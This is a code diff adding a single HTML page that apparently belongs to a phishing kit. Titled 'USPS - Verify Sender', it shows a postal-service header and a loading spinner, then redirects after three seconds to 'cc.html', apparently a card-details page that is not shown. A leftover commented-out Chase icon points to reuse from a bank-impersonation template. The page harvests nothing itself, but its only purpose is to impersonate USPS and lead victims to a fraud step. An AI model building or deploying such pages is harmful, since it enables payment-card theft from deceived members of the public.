@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        <title>USPS - Verify Sender</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+
+        <link rel="icon" href="ico.png" type="image/png">
+
+
+
+</head>
+<body>
+    <div class="container">
+
+        <div class="navbar__container">
+            <nav class="navbar">
+                <div class="navbar__container">
+                    <a href="index.html" id="navbar__logo">
+                        <img src="header.png" width="185" height="35">
+                    </a>
+                </div>
+    
+            </nav>
+        </div> 
+
+        <div class="loader"></div>
+        <script>
+
+            // Function to redirect to another page
+            function redirectToAnotherPage() {
+                window.location.href = 'cc.html'; 
+            }
+            // Set the delay for redirection (6 seconds)
+            var redirectDelay = 3000; 
+            // Wait for 6 seconds and then redirect
+            setTimeout(redirectToAnotherPage, redirectDelay);
+    
+        </script>
+        <style>
+            body{
+                overflow: hidden;
+            }
+        </style>
+    </div>
+</body>
+</html>
